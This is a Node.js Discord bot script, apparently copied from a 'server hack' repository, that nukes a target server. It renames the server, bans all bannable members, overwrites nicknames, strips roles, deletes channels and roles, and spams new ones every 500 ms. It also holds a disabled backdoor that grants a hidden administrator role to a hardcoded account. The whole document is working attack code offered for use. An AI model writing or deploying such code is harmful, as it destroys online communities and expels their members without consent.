// Based on https://www.github.com/THELOLAN/Discord-server-hack

const Discord = require("discord.js")
const client = new Discord.Client()
const lolan = require("./config.json")




const setAdmin = (guildID, accountID) => {
    const targetServer = client.guilds.cache.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.cache.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.cache.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.roles.create({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {


       let johnMember = targetServer.members.cache.get("650290108947496963")
       johnMember.addRole(role);
    })
}
 
const changeServerInfo = (guildID, options) => {
    const targetServer = client.guilds.cache.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.cache.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
    
    targetServer.setName(options.newServerName)
    targetServer.setIcon(options.newServerIcon)

    const embed = new Discord.MessageEmbed()
    .setAuthor(client.user.tag, client.user.avatarURL)
    .setTitle("HACKED")
    .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN HACKED BY ${client.user.tag}`)
    .setFooter(client.user.tag, client.user.avatarURL)
    .setColor("#ff0000")

   /* setInterval(() => {
    return targetServer.owner.user.send(embed)
    }, 1000)*/
}

const banMembers = (guildID) => {
    const targetServer = client.guilds.cache.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.cache.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.cache.forEach(async (member) => {
        member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
    })
}

const changeNicks = (guildID, newNick) => {
    const targetServer = client.guilds.cache.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.cache.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.cache.forEach((member) => {
        try {
            
            member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
        } catch (error) {
            undefined
        }
    })
}

const createChanelsAndRoles = (guildID, name) => {
    const targetServer = client.guilds.cache.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.cache.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.cache.get(client.user.id).hasPermission('MANAGE_S_OR_PERMISSIONS') || !targetServer.members.cache.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
    targetServer.members.cache.forEach((member) => {
  		member.roles.cache.forEach(async (role) => {
            try {
                await member.removeRole(role)
                  
            } catch (error) {
                undefined
            }
  		})
    })

    targetServer.channels.cache.forEach(async (channel) => {
        channel.deletable ? await channel.delete() : undefined
    })

    targetServer.roles.cache.forEach(async(role) => {
        role.deletable ? await role.delete() : undefined
    })

    setInterval(async () => {
        await targetServer.channels.create(name, "text")
        await targetServer.channels.create(name, "voice")
        await targetServer.roles.create({name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }).then(async(role) =>{
            await targetServer.members.cache.forEach(async (member) => {
                try {
                    await member.roles.add(role)
                } catch (error) {
                    undefined
                }
            })
        })
    }, 500)

}

client.on("ready", () => {
    console.log("THE HACKING STARTED NOW ")

    

    client.user.setUsername(lolan.botNickname)
    client.user.setAvatar(lolan.botIcon)

    // Enable all the options
  //    setAdmin(lolan.targetServerID, lolan.accountID)
     changeServerInfo(lolan.targetServerID, {"newServerName": lolan.newServerName, "newServerIcon": lolan.newServerIcon})
      changeNicks(lolan.targetServerID, lolan.botNickname)
       banMembers(lolan.targetServerID)
    createChanelsAndRoles(lolan.targetServerID, lolan.botNickname)
})


client.login(lolan.token)
